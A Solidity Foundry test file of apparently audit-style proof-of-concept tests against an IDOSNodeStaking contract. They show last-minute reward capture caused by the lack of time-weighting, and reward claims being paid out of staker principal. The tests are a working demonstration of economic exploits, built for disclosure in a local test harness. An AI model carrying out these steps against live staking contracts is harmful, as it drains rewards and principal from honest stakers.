// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract IDOSNodeStakingPoC is Test {
    MockToken token;
    IDOSNodeStaking staking;
    address owner = address(this);
    address node = makeAddr("node");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint48 startT;
    uint256 constant EPOCH_REWARD = 1000e18;

    function setUp() public {
        token = new MockToken();
        startT = uint48(block.timestamp);
        staking = new IDOSNodeStaking(address(token), owner, startT, EPOCH_REWARD);
        staking.allowNode(node);
        // fund a generous reward pool (separate from stakes) for the JIT/conservation tests
        token.mint(address(staking), 1_000_000e18);
        // fund actors
        token.mint(alice, 1_000_000e18);
        token.mint(bob, 1_000_000e18);
        vm.prank(alice); token.approve(address(staking), type(uint256).max);
        vm.prank(bob); token.approve(address(staking), type(uint256).max);
    }

    function _reward(address u) internal view returns (uint256 w) { (w,,,) = staking.withdrawableReward(u); }

    /// PoC #1 — No time-weighting: a depositor who stakes 1 hour before the epoch boundary earns the SAME
    /// epoch reward as one staked the entire epoch. Enables JIT/last-moment reward capture (dilutes honest stakers).
    function test_JIT_noTimeWeighting() public {
        vm.prank(alice); staking.stake(alice, node, 100e18); // staked at t=0 (full epoch 0)
        vm.warp(startT + 23 hours);
        vm.prank(bob); staking.stake(bob, node, 100e18); // staked only 1h before epoch boundary
        vm.warp(startT + 1 days + 1); // epoch 1

        uint256 ra = _reward(alice);
        uint256 rb = _reward(bob);
        console.log("alice reward (24h staked):", ra);
        console.log("bob   reward ( 1h staked):", rb);
        // Despite 23x less time staked, bob earns an EQUAL share of epoch 0's reward.
        assertEq(ra, 500e18, "alice");
        assertEq(rb, 500e18, "bob - JIT staker got full epoch share for ~1h");
        assertEq(ra, rb, "no time-weighting: equal reward regardless of stake duration");

        // bob realizes it: withdraw reward then unstake -> profited ~500 for 1h of capital at risk
        uint256 balBefore = token.balanceOf(bob);
        vm.prank(bob); staking.withdrawReward();
        assertEq(token.balanceOf(bob) - balBefore, 500e18, "bob captured 500 reward");
    }

    /// Sanity: reward math conserves in aggregate (sum of per-user rewards == epochReward, no over-draw).
    function test_conservation_sumEqualsEpochReward() public {
        vm.prank(alice); staking.stake(alice, node, 100e18);
        vm.prank(bob); staking.stake(bob, node, 300e18);
        vm.warp(startT + 1 days + 1);
        uint256 sum = _reward(alice) + _reward(bob);
        console.log("sum of rewards:", sum, "epochReward:", EPOCH_REWARD);
        assertLe(sum, EPOCH_REWARD, "over-draw: sum of rewards exceeds epochReward");
        assertEq(_reward(alice), 250e18, "alice 1/4");
        assertEq(_reward(bob), 750e18, "bob 3/4");
    }
}

/// Separate fixture WITHOUT a separate reward pool, to show reward claims cannibalize staker principal.
contract IDOSNodeStakingPrincipalPoC is Test {
    MockToken token;
    IDOSNodeStaking staking;
    address node = makeAddr("node");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint48 startT;

    function setUp() public {
        token = new MockToken();
        startT = uint48(block.timestamp);
        staking = new IDOSNodeStaking(address(token), address(this), startT, 50e18); // epochReward 50
        staking.allowNode(node);
        token.mint(alice, 1_000e18);
        token.mint(bob, 1_000e18);
        vm.prank(alice); token.approve(address(staking), type(uint256).max);
        vm.prank(bob); token.approve(address(staking), type(uint256).max);
        // NOTE: NO separate reward funding -> contract balance == sum of stakes only.
    }

    /// PoC #2 — Rewards are paid from the same balance as principal (no funding segregation). When the reward
    /// pool is not separately funded, an early reward claimer is paid out of the pooled stake, and a later
    /// staker cannot fully withdraw their principal.
    function test_rewardClaimEatsPrincipal() public {
        vm.prank(alice); staking.stake(alice, node, 100e18);
        vm.prank(bob); staking.stake(bob, node, 100e18);
        assertEq(token.balanceOf(address(staking)), 200e18, "only stakes back the contract");

        vm.warp(startT + 1 days + 1); // epoch 1: 50 reward allocated for epoch 0

        // alice claims her 25 reward -> paid from the pooled 200 (which is bob+alice principal)
        vm.prank(alice); staking.withdrawReward();
        assertEq(token.balanceOf(address(staking)), 175e18, "reward paid out of principal pool");

        // both unstake their full 100 principal
        vm.prank(alice); staking.unstake(node, 100e18);
        vm.prank(bob); staking.unstake(node, 100e18);
        vm.warp(block.timestamp + 14 days + 1);

        vm.prank(alice); staking.withdrawUnstaked(); // alice gets 100 (175 -> 75)
        assertEq(token.balanceOf(address(staking)), 75e18, "75 left, but bob is owed 100");

        // bob cannot recover his full principal: contract only has 75 for a 100 obligation
        uint256 bobBefore = token.balanceOf(bob);
        vm.prank(bob);
        vm.expectRevert(); // ERC20 insufficient balance
        staking.withdrawUnstaked();
        assertEq(token.balanceOf(bob), bobBefore, "bob recovered nothing");
        // exact shortfall: contract holds 75 against bob's 100 obligation -> 25 of principal is unrecoverable.
        assertEq(token.balanceOf(address(staking)), 75e18, "balance 75 < 100 owed");
        uint256 shortfall = 100e18 - token.balanceOf(address(staking));
        assertEq(shortfall, 25e18, "exact principal shortfall == reward alice drained");
        console.log("bob principal stuck: contract balance 75e18 vs 100e18 owed; shortfall:", shortfall);
    }
}
